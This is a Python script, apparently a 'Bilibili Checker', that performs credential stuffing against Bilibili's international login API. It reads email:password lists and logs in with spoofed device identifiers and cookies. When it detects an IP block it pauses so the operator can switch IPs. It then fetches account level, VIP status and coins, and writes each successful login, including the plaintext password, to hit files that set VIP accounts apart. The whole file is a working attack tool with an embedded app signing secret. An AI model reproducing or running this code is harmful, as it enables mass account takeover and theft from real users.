import requests
import uuid
import time
import os
import hashlib
from base64 import b64encode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import brotli
import json
from colorama import init, Fore, Style, Back
import threading
from queue import Queue, Empty

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.MAGENTA}  ____  _ _ _     _     _ _   _ _   _ _____  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} | __ )(_) (_)___| |__ (_) |_(_) |_(_)__  /  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} |  _ \| | | / __| '_ \| | __| | __| | / /   {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} | |_) | | | \__ \ | | | | |_| | |_| |/ /_   {Fore.CYAN}║
{Fore.CYAN}║ {Fore.MAGENTA} |____/|_|_|_|___/_| |_|_|\__|_|\__|_/____|  {Fore.CYAN}║
{Fore.CYAN}║                                              ║
{Fore.CYAN}║       {Fore.YELLOW}Bilibili Checker v1.1 (Auto-Pause){Fore.CYAN}             ║
{Fore.CYAN}║       {Fore.GREEN}Updated for Block Detection{Fore.CYAN}                    ║
{Fore.CYAN}╚══════════════════════════════════════════════════╝
"""

class AccountChecker:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.checked = 0
        self.total = 0
        self.running = True
        # เพิ่ม Event สำหรับควบคุมการหยุดชั่วคราว
        self.pause_event = threading.Event()
        self.pause_event.set() # เริ่มต้นให้ทำงานได้เลย
        self.is_paused = False

    def generate_sign(self, params, secret_key="59b43e04ad6965f34319062b478f83dd"):
        params_str = '&'.join([f'{k}={v}' for k, v in sorted(params.items())])
        sign_str = params_str + secret_key
        return hashlib.md5(sign_str.encode('utf-8')).hexdigest()

    def get_account_details(self, session, access_token):
        params = {
            "access_key": access_token,
            "appkey": "7d089525d3611b1c",
            "build": "3291100",
            "c_locale": "",
            "channel": "master",
            "fnval": "16",
            "fnver": "0",
            "lang": "",
            "locale": "en_US",
            "market": "google",
            "mobi_app": "bstar_a",
            "model": "SM-N975F",
            "net_type": "1",
            "osver": "9",
            "platform": "android",
            "prefer_code_type": "0",
            "s_locale": "en_US",
            "sim_code": "51501",
            "statistics": json.dumps({"appId":30,"platform":3,"version":"3.29.1","abtest":""}),
            "timezone": "GMT+08:00",
            "ts": str(int(time.time())),
            "user_qn": "0"
        }
        params["sign"] = self.generate_sign(params)
        url = "https://app.biliintl.com/intl/gateway/v2/app/account/myinfo"
        try:
            response = session.get(url, params=params, timeout=10)
            if response.status_code == 200:
                content = None
                if 'br' in response.headers.get('Content-Encoding', ''):
                    try: content = brotli.decompress(response.content)
                    except: content = response.content
                else:
                    content = response.content
                data = json.loads(content.decode('utf-8'))
                if data.get("code") == 0:
                    return data.get("data", {})
        except:
            pass
        return None

    def process_account(self, email, password, queue):
        # จุดรอ: ถ้ามีการ Pause เธรดจะหยุดตรงนี้
        self.pause_event.wait()
        
        device_id = str(uuid.uuid4())
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://tv.bilibili.tv",
            "Connection": "keep-alive",
            "Referer": "https://tv.bilibili.tv/",
        }
        session.headers.update(headers)
        session.cookies.update({
            "buvid3": str(uuid.uuid4()),
            "bstar-web-lang": "en",
            "_ga": "GA1.1." + str(uuid.uuid4().hex[:16]),
        })
        params = {
            "s_locale": "en_US",
            "timezone": "Asia/Shanghai",
            "device": "browser",
            "build": "1070000",
            "platform": "ott_web_browser",
            "mobi_app": "bstar_a_t_w_b",
            "ts": str(int(time.time() * 1000)),
            "device_id": device_id,
            "device_name": "Chrome",
            "device_platform": "Windows",
            "networkstate": "wifi",
            "buvid": str(uuid.uuid4()),
        }
        
        try:
            url = "https://passport.bilibili.tv/x/intl/passport-login/tv/key"
            response = session.get(url, params=params, timeout=10)
            
            content = response.content
            if 'br' in response.headers.get('Content-Encoding', ''):
                try: content = brotli.decompress(content)
                except: pass
            
            # --- ตรวจจับการบล็อก (JSON Error / Empty Response) ---
            try:
                data = json.loads(content.decode('utf-8'))
            except json.JSONDecodeError:
                # ถ้าถอดรหัส JSON ไม่ได้ แสดงว่าโดนบล็อกหรือ Server Error
                with self.lock:
                    if not self.is_paused:
                        self.is_paused = True
                        self.pause_event.clear() # สั่งหยุดทุก Thread
                        queue.put(("SYSTEM_PAUSE", "IP BLOCKED / JSON ERROR DETECTED"))
                return

            if data.get("message", "").lower().find("country code") != -1:
                queue.put((email, Fore.RED + "Please select the correct country code" + Style.RESET_ALL))
                return
            if data.get("code") != 0:
                queue.put((email, Fore.RED + "Login Failed (Key Error)" + Style.RESET_ALL))
                return

            key = RSA.import_key(data["data"]["key"])
            cipher = PKCS1_v1_5.new(key)
            encrypted_password = b64encode(cipher.encrypt((data["data"]["hash"] + password).encode())).decode()
            
            login_data = params.copy()
            login_data.update({
                "username": email,
                "password": encrypted_password,
            })
            login_url = "https://passport.bilibili.tv/x/intl/passport-login/tv/login/email/password"
            login_response = session.post(login_url, data=login_data, timeout=15)
            
            login_content = login_response.content
            if 'br' in login_response.headers.get('Content-Encoding', ''):
                try: login_content = brotli.decompress(login_content)
                except: pass
            
            # ตรวจจับการบล็อกตอน Login ด้วย
            try:
                login_data_json = json.loads(login_content.decode('utf-8'))
            except json.JSONDecodeError:
                with self.lock:
                    if not self.is_paused:
                        self.is_paused = True
                        self.pause_event.clear()
                        queue.put(("SYSTEM_PAUSE", "LOGIN BLOCKED / JSON ERROR"))
                return

            if login_data_json.get("code") == 0:
                access_token = login_data_json["data"]["token_info"]["access_token"]
                account_details = self.get_account_details(session, access_token)
                
                details = {
                    'email': email,
                    'password': password,
                    'username': account_details.get('name', 'N/A') if account_details else 'N/A',
                    'level': account_details.get('level', 'N/A') if account_details else 'N/A',
                    'vip': account_details.get('vip', {}).get('type', 'N/A') if account_details else 'N/A',
                    'coins': account_details.get('coins', 'N/A') if account_details else 'N/A'
                }

                with self.lock:
                    self.hits += 1
                    # 1. บันทึก .txt (Format เดิม)
                    with open("bilibili_hits.txt", "a", encoding='utf-8') as hit_file:
                        hit_file.write(f"{details['email']}:{details['password']} | Name: {details['username']} | Level: {details['level']} | Vip: {details['vip']} | Coins: {details['coins']} | Config By = @Rachelle2134\n")
                    
                    # 2. บันทึก .json (Format ใหม่ สวยงาม)
                    try:
                        json_file = "bilibili_hits.json"
                        if os.path.exists(json_file) and os.path.getsize(json_file) > 0:
                            with open(json_file, "r", encoding="utf-8") as f:
                                json_data = json.load(f)
                        else:
                            json_data = {"hits": [], "vip_hits": []}
                        
                        target_list = "vip_hits" if details['vip'] not in [0, '0', 'N/A'] else "hits"
                        json_data[target_list].append(details)
                        
                        with open(json_file, "w", encoding="utf-8") as f:
                            json.dump(json_data, f, ensure_ascii=False, indent=4)
                    except:
                        pass # กัน Error เรื่องไฟล์ JSON ไม่ให้หยุดโปรแกรม

                queue.put((email, Fore.GREEN + "Login Successful" + Style.RESET_ALL))
            elif "incorrect" in login_data_json.get("message", "").lower():
                queue.put((email, Fore.RED + "Incorrect account credentials" + Style.RESET_ALL))
            else:
                queue.put((email, Fore.RED + login_data_json.get("message", "Login Failed") + Style.RESET_ALL))
        
        except Exception as e:
            queue.put((email, Fore.RED + f"Error: {str(e)[:20]}" + Style.RESET_ALL))
        finally:
            session.close()
            with self.lock:
                self.checked += 1

    def worker(self, queue, result_queue):
        while self.running:
            try:
                account = queue.get(timeout=1)
                if account is None:
                    break
                email, password = account
                self.process_account(email, password, result_queue)
                queue.task_done()
            except Empty:
                continue
            except:
                continue

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    filename = input(Fore.YELLOW + "Enter accounts file (email:password format): " + Style.RESET_ALL).strip()
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            accounts = [line.strip().split(':', 1) for line in file if ':' in line]
    except:
        print(Fore.RED + "Error reading file" + Style.RESET_ALL)
        return
    try:
        thread_count_input = input(Fore.YELLOW + "Enter number of threads (recommended 5-10): " + Style.RESET_ALL).strip()
        thread_count = int(thread_count_input) if thread_count_input else 5
    except:
        thread_count = 5
    
    checker = AccountChecker()
    checker.total = len(accounts)
    
    # เคลียร์/สร้างไฟล์ผลลัพธ์
    with open("bilibili_hits.txt", "w", encoding='utf-8') as hit_file:
        hit_file.write("")
    
    account_queue = Queue()
    result_queue = Queue()
    for account in accounts:
        account_queue.put(account)
    
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=checker.worker, args=(account_queue, result_queue))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while checker.checked < checker.total:
            try:
                # รับข้อมูลจาก Queue
                data = result_queue.get(timeout=0.2)
                
                # ตรวจสอบว่าเป็นคำสั่งให้หยุดหรือไม่
                if isinstance(data, tuple) and data[0] == "SYSTEM_PAUSE":
                    print(f"\n{Back.RED}{Fore.WHITE} [!!!] BLOCK DETECTED: {data[1]} [!!!] {Style.RESET_ALL}")
                    input(Fore.CYAN + " >>> Press [ENTER] to resume checking (Change IP if needed) <<< " + Style.RESET_ALL)
                    checker.is_paused = False
                    checker.pause_event.set() # สั่งให้ทำงานต่อ
                    continue

                email, status = data
                print(f"[ {Fore.BLUE + email + Style.RESET_ALL} ] = [ {status} ]")
                print(f"\r{Fore.CYAN}Progress: {checker.checked}/{checker.total} | Hits: {checker.hits}{Style.RESET_ALL}", end="", flush=True)
            except Empty:
                continue
            except KeyboardInterrupt:
                break
    except KeyboardInterrupt:
        checker.running = False
        print(Fore.YELLOW + "\nShutting down gracefully..." + Style.RESET_ALL, flush=True)
    
    checker.running = False
    print(Fore.GREEN + f"\nChecking complete. Hits: {checker.hits}/{checker.total} saved to bilibili_hits.txt & .json" + Style.RESET_ALL, flush=True)

if __name__ == "__main__":
    main()
